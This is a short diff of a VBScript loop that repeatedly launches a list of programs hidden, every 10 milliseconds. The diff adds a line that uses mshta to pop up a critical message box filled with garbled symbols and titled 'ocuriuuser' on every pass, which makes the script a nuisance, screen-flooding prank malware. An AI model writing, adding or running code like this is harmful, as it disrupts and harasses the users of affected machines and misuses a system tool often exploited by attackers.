@@ -28,4 +28,5 @@ Do
         CreateObject("WScript.Shell").Run programs(i), 0, False
     End If
     WScript.Sleep 10
+    CreateObject("WScript.Shell").Run "mshta vbscript:MsgBox(""$|%^%$%^%$£$^&^%$£$%^%$£$%^%$"",vbCritical,""ocuriuuser"")", 0, False
 Loop
